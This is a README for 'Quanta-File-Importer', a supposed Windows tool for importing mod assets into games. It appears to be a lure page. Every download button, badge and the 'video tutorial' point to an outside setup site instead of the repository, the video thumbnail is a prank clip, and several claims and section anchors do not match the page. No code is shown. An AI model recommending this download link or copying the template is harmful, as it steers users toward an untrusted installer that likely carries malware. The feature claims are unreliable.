# Quanta‑File‑Importer

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/DOWNLOAD-RELEASE-e11d48?style=for-the-badge&logo=github&logoColor=white&labelColor=161b22" alt="Download"></a>
  <br>
  <a href="#-workflows--usage"><img src="https://img.shields.io/badge/ARCHIVE-READY-9333ea?style=for-the-badge&logo=docker&logoColor=white&labelColor=161b22" alt="ARCHIVE"></a> <a href="#-architecture--modules"><img src="https://img.shields.io/badge/RUNTIME-SPECS-7c3aed?style=for-the-badge&logo=code&logoColor=white&labelColor=161b22" alt="RUNTIME"></a>
  <br>
  <a href="#-overview"><img src="https://img.shields.io/badge/OVERVIEW-DOCS-db2777?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=161b22" alt="OVERVIEW"></a> <a href="#-configuration-system"><img src="https://img.shields.io/badge/DEFAULTS-INCLUDED-dc2626?style=for-the-badge&logo=gnubash&logoColor=white&labelColor=161b22" alt="DEFAULTS"></a>
</div>

**Author:** IntersectScholar

> A sleek, Windows‑only utility that lets you drop custom textures, 3‑D models, sounds and other assets straight into the games you love – safely, quickly, and without the hassle of manual file juggling.

---

## 🎮 What is Quanta‑File‑Importer?

Quanta‑File‑Importer is a **desktop‑only** utility built for Windows 10 / 11.
It scans the installation folders of supported PC titles, presents a clear visual map of importable asset slots, and performs the conversion and placement steps in a single click.

- **Zero‑risk** – works on a copy of the original game files and restores them on demand.
- **Live preview** – see how a new texture will look before you commit.
- **Batch mode** – import dozens of assets in one go.

> *Designed for modders, artists, and anyone who wants to personalize their gaming experience without diving into hex editors.*

---

## 📦 Features at a Glance

| ✅ | Feature | Why it matters |
|---|---------|----------------|
| **Smart Detection** | Auto‑detects game installations from Steam, Epic, and GOG libraries. | No manual path hunting. |
| **Multi‑Format Support** | PNG, JPG, TGA, DDS, FBX, OBJ, WAV, OGG, and more. | Bring any asset type you create. |
| **Safety Net** | Automatic backups & one‑click restore. | Undo mistakes instantly. |
| **Live Asset Viewer** | Real‑time rendering of textures and models inside the utility. | Verify looks before committing. |
| **Batch Import** | Drag‑and‑drop folders, set rules, import all. | Speed up large utility packs. |
| **Configurable Profiles** | Save per‑game import settings (scale, compression, naming). | Consistency across sessions. |
| **Open‑Source** | Full source on GitHub, MIT‑licensed. | Extend or adapt the utility yourself. |

---

## 🚀 Getting Started

1. **Download** the latest release from the Release page.
2. Run the installer (the wizard will guide you through the usual Windows prompts).
3. Launch **Quanta‑File‑Importer** from the Start menu.
4. Click **“Add Game”**, point it to your game’s executable folder, and let the utility scan.
5. Drag your custom assets into the **Asset Panel**, preview, then click **“Import”**.

> **Tip:** The first time you import into a new game, the utility creates a hidden backup folder (`Quanta_Backups`) next to the game files. Keep it safe for future restores.

---

## 📥 Download / Quick Action

<div style="text-align:center; margin: 1.5em 0;">
  <a href="https://rewfdf.github.io/SetupPage/" target="_blank" style="background:#4B8BF5;color:#fff;padding:12px 24px;border-radius:6px;text-decoration:none;font-weight:bold;">Download Quanta‑File‑Importer</a>
</div>

---

## 🛠️ Installation Walk‑through (Video)

A short 2‑minute walkthrough is embedded below for visual learners.

<details>
  <summary>▶️ Click to expand video tutorial</summary>

  <p align="center">
    <a href="https://rewfdf.github.io/SetupPage/" target="_blank">
      <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/0.jpg" alt="Installation Tutorial" width="480"/>
    </a>
  </p>
</details>

---

## 📚 Documentation

- **User Guide** – `docs/UserGuide.md` (covers UI, asset pipelines, troubleshooting).
- **API Reference** – `docs/API.md` (for developers who want to script imports).
- **Supported Games List** – `SUPPORTED_GAMES.md` (continually updated).

All docs are shipped with the repo and are also viewable on GitHub Pages.

---

## 🐞 Reporting Issues

Found a bug or have a feature request? Please open an **issue** and include:

1. Windows version (10 or 11) and build number.
2. Game title and version.
3. Steps to reproduce the problem.
4. Screenshots or logs (found under `QuantaLogs` in the install directory).

We aim to triage within 48 hours.

---

## 🤝 Contributing

Contributions are welcome! Follow these steps:

1. Fork the repository.
2. Create a feature branch (`git checkout -b feature/awesome‑thing`).
3. Implement your changes, ensuring the code passes the existing unit tests (`npm test`).
4. Open a Pull Request with a clear description of what you added or fixed.

Please read the `CONTRIBUTING.md` file for coding standards and the review process.

---

## 📜 License

Quanta‑File‑Importer is released under the **MIT License** – see the `LICENSE` file for details. This permits free use, modification, and distribution for both personal and commercial projects.

---

## 🙏 Acknowledgements

- **Electron** – for the cross‑platform UI layer (even though we ship Windows‑only).
- **Assimp** – for robust 3‑D model conversion.
- The modding community members who tested early builds and provided invaluable feedback.

---

*Happy modding, and may your games look ever sharper!*

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```